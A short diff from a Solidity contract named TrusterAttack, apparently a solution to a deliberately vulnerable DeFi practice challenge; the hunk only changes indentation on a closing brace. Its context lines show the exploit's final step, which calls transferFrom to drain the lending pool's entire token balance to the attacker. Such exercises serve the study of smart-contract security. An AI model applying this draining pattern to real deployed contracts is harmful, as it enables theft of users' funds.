@@ -28,5 +28,5 @@ contract TrusterAttack {
         
         // as an approved spender, tranfer all the tokens from the pool to the attacker (msg.sender)
         damnValuableToken.transferFrom(lenderPool, msg.sender, balanceToDrain);
-	}
+    }
 }
